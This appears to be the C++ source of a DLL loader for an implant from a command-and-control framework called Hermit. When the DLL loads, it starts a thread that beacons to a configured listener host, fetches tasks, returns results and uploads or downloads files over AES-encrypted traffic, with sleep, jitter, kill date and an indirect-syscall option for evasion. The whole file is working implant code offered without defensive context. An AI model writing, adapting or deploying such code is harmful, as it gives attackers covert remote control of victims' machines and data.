#include "hermit.hpp"

#define MAX_THREADS 3

DWORD WINAPI ThreadProc(LPVOID lpParam);
 BOOL g_runFinished = FALSE;

DLLEXPORT VOID Start()
{
    while (TRUE)
    {
        Sleep(24*60*60*1000);
    }
}

DLLEXPORT BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    HANDLE hThread = NULL;

    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
            // Execute the Run function within a new thread
            // because WinHTTP functions are not usable in DllMain.
            hThread = CreateThread(
                NULL,
                0,
                ThreadProc,
                hinstDLL,
                0,
                NULL
            );
            // WaitForSingleObject(hThread, INFINITE);
            // CloseHandle(hThread);
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

DWORD WINAPI ThreadProc(LPVOID lpParam)
{
    Hermit::Run(
        NULL,
        0,
        PAYLOAD_TYPE_W,
        #ifdef PAYLOAD_INDIRECT_SYSCALLS
		TRUE,
		#else
		FALSE,
		#endif
        LISTENER_PROTOCOL_W,
        LISTENER_HOST_W,
        (INTERNET_PORT)LISTENER_PORT,
        REQUEST_PATH_CHECKIN_W,
        REQUEST_PATH_DOWNLOAD_W,
        REQUEST_PATH_TASKGET_W,
        REQUEST_PATH_TASKRESULT_W,
        REQUEST_PATH_UPLOAD_W,
        REQUEST_PATH_WEBSOCKET_W,
        PAYLOAD_SLEEP,
        PAYLOAD_JITTER,
        PAYLOAD_KILLDATE,
        AES_KEY_BASE64_W,
        AES_IV_BASE64_W
    );

    g_runFinished = TRUE;

    return 0;
}